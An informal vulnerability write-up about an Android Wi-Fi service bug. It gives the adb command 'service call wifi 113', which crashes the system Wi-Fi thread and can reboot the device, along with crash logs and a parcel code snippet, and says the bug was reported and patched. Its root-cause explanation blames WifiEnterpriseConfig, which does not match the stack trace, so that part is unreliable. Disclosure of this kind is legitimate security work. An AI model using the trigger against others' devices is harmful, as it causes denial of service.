# Silly calls and silly bugs 

bugs in android that cause a dos. 

I was needing a break form IOS and MACos so I deviced to focous on Android  bugs and a way to find them, this lead me down a rabit hole about service calls. In this write up, I will cover service calls, and a null defefferecne which leads to the device shutting off once sent via abd to the device. 

![Android Stack](https://source.android.com/static/images/android-stack.svg)

Service call layout:
$ adb shell SERVICENAME 


Covering the crash, afetr we send our service call, to the wifi stack, we can see the following crash, if we continie to spam the device with the packets after the null pointer it then shuts off the device and causes a reboot, for some reason I do not know why. But this is what it does. It has since been patched and can be seen here[] as patched, I may have submitted it the wrong way to the Android team, I thought if you posted directly on thier bugs some bugs could get noticed by the security team where this is not the case, I then had to then re report the bug to product security and hopefully, this meets the critiria for a CVE as it does cause a dos in the system due to a NPE.

```bash
$ adb adb shell service call wifi 113

$ adb logcat -b crash
02-22 14:12:14.922 13325 13606 E AndroidRuntime: 	at android.os.RemoteCallbackList.unregister(RemoteCallbackList.java:156)
02-22 14:12:14.922 13325 13606 E AndroidRuntime: 	at com.android.server.wifi.WifiMetrics.removeOnWifiUsabilityListener(WifiMetrics.java:7559)
02-22 14:12:14.922 13325 13606 E AndroidRuntime: 	at com.android.server.wifi.WifiServiceImpl.lambda$removeOnWifiUsabilityStatsListener$108(WifiServiceImpl.java:6283)
02-22 14:12:14.922 13325 13606 E AndroidRuntime: 	at com.android.server.wifi.WifiServiceImpl.$r8$lambda$SBpNFH_Zvv16E23PY-wxYG5jMI4(WifiServiceImpl.java:0)
02-22 14:12:14.922 13325 13606 E AndroidRuntime: 	at com.android.server.wifi.WifiServiceImpl$$ExternalSyntheticLambda117.run(R8$$SyntheticClass:0)
02-22 14:12:14.922 13325 13606 E AndroidRuntime: 	at android.os.Handler.handleCallback(Handler.java:958)
02-22 14:12:14.922 13325 13606 E AndroidRuntime: 	at android.os.Handler.dispatchMessage(Handler.java:99)
02-22 14:12:14.922 13325 13606 E AndroidRuntime: 	at com.android.server.wifi.RunnerHandler.dispatchMessage(RunnerHandler.java:122)
02-22 14:12:14.922 13325 13606 E AndroidRuntime: 	at android.os.Looper.loopOnce(Looper.java:230)
02-22 14:12:14.922 13325 13606 E AndroidRuntime: 	at android.os.Looper.loop(Looper.java:319)
02-22 14:12:14.922 13325 13606 E AndroidRuntime: 	at android.os.HandlerThread.run(HandlerThread.java:67)
02-22 14:12:15.126 14876 30004 E AndroidRuntime: FATAL EXCEPTION: lowpool[28]
02-22 14:12:15.126 14876 30004 E AndroidRuntime: Process: com.google.android.gms.persistent, PID: 14876
02-22 14:12:15.126 14876 30004 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
02-22 14:15:18.576 30232 30495 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: WifiHandlerThread
02-22 14:15:18.576 30232 30495 E AndroidRuntime: java.lang.NullPointerException: Attempt to invoke interface method 'android.os.IBinder android.os.IInterface.asBinder()' on a null object reference
02-22 14:15:18.576 30232 30495 E AndroidRuntime: 	at android.os.RemoteCallbackList.unregister(RemoteCallbackList.java:156)
02-22 14:15:18.576 30232 30495 E AndroidRuntime: 	at com.android.server.wifi.WifiMetrics.removeOnWifiUsabilityListener(WifiMetrics.java:7559)
02-22 14:15:18.576 30232 30495 E AndroidRuntime: 	at com.android.server.wifi.WifiServiceImpl.lambda$removeOnWifiUsabilityStatsListener$108(WifiServiceImpl.java:6283)
02-22 14:15:18.576 30232 30495 E AndroidRuntime: 	at com.android.server.wifi.WifiServiceImpl.$r8$lambda$SBpNFH_Zvv16E23PY-wxYG5jMI4(WifiServiceImpl.java:0)
02-22 14:15:18.576 30232 30495 E AndroidRuntime: 	at com.android.server.wifi.WifiServiceImpl$$ExternalSyntheticLambda117.run(R8$$SyntheticClass:0)
02-22 14:15:18.576 30232 30495 E AndroidRuntime: 	at android.os.Handler.handleCallback(Handler.java:958)
02-22 14:15:18.576 30232 30495 E AndroidRuntime: 	at android.os.Handler.dispatchMessage(Handler.java:99)
02-22 14:15:18.576 30232 30495 E AndroidRuntime: 	at com.android.server.wifi.RunnerHandler.dispatchMessage(RunnerHandler.java:122)
02-22 14:15:18.576 30232 30495 E AndroidRuntime: 	at android.os.Looper.loopOnce(Looper.java:230)
02-22 14:15:18.576 30232 30495 E AndroidRuntime: 	at android.os.Looper.loop(Looper.java:319)
02-22 14:15:18.576 30232 30495 E AndroidRuntime: 	at android.os.HandlerThread.run(HandlerThread.java:67)
02-22 14:18:15.797 15657 15912 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: WifiHandlerThread
02-22 14:18:15.797 15657 15912 E AndroidRuntime: java.lang.NullPointerException: Attempt to invoke interface method 'android.os.IBinder android.os.IInterface.asBinder()' on a null object reference
02-22 14:18:15.797 15657 15912 E AndroidRuntime: 	at android.os.RemoteCallbackList.unregister(RemoteCallbackList.java:156)
02-22 14:18:15.797 15657 15912 E AndroidRuntime: 	at com.android.server.wifi.WifiMetrics.removeOnWifiUsabilityListener(WifiMetrics.java:7559)
02-22 14:18:15.797 15657 15912 E AndroidRuntime: 	at com.android.server.wifi.WifiServiceImpl.lambda$removeOnWifiUsabilityStatsListener$108(WifiServiceImpl.java:6283)
02-22 14:18:15.797 15657 15912 E AndroidRuntime: 	at com.android.server.wifi.WifiServiceImpl.$r8$lambda$SBpNFH_Zvv16E23PY-wxYG5jMI4(WifiServiceImpl.java:0)
02-22 14:18:15.797 15657 15912 E AndroidRuntime: 	at com.android.server.wifi.WifiServiceImpl$$ExternalSyntheticLambda117.run(R8$$SyntheticClass:0)
02-22 14:18:15.797 15657 15912 E AndroidRuntime: 	at android.os.Handler.handleCallback(Handler.java:958)
02-22 14:18:15.797 15657 15912 E AndroidRuntime: 	at android.os.Handler.dispatchMessage(Handler.java:99)
02-22 14:18:15.797 15657 15912 E AndroidRuntime: 	at com.android.server.wifi.RunnerHandler.dispatchMessage(RunnerHandler.java:122)
02-22 14:18:15.797 15657 15912 E AndroidRuntime: 	at android.os.Looper.loopOnce(Looper.java:230)
02-22 14:18:15.797 15657 15912 E AndroidRuntime: 	at android.os.Looper.loop(Looper.java:319)
02-22 14:18:15.797 15657 15912 E AndroidRuntime: 	at android.os.HandlerThread.run(HandlerThread.java:67)
```
Now if the Javascript code is then reviewed this can be traced to the following paramaters of the JS object. 

![Android WIFI stack](https://source.android.com/static/docs/core/architecture/images/wifi-components.png)


#### - android.net.wifi.WifiEnterpriseConfig
```Java 
public static final Creator<WifiEnterpriseConfig> CREATOR =
            new Creator<WifiEnterpriseConfig>() {
                public WifiEnterpriseConfig createFromParcel(Parcel in) {
                    WifiEnterpriseConfig enterpriseConfig = new WifiEnterpriseConfig();
                    int count = in.readInt();
                    for (int i = 0; i < count; i++) {
                        String key = in.readString();
                        String value = in.readString();
                        enterpriseConfig.mFields.put(key, value);
                    }
                    enterpriseConfig.mCaCert = readCertificate(in);
                    PrivateKey userKey = null;
                    int len = in.readInt();
                    if (len > 0) {
                        try {
                            byte[] bytes = new byte[len];
                            in.readByteArray(bytes);
                            String algorithm = in.readString();
                            KeyFactory keyFactory = KeyFactory.getInstance(algorithm);
                            userKey = keyFactory.generatePrivate(new PKCS8EncodedKeySpec(bytes));
                        } catch (NoSuchAlgorithmException e) {
                            userKey = null;
                        } catch (InvalidKeySpecException e) {
                            userKey = null;
                        }
                    }
                    enterpriseConfig.mClientPrivateKey = userKey;
                    enterpriseConfig.mClientCertificate = readCertificate(in);
                    return enterpriseConfig;
                }
```

The trigger of the crash is the following, by simply calling wifi 113 

``` Java 
enterpriseConfig.mFields.put(key, value);
```
The mfields are used as a hash reprensetation of the keys used for authentication in the WifiEnterpriseConfig which would make sense as there needs to be some form of verification/attistation for WIFI. By giving this a null or simply call the service without any other stages for authentication will simpaly trigger the defrffrence, though this could be triggered ina real situation, if just a null object was passed to the device when it is searching for wifi. 




https://issuetracker.google.com/issues/326278126




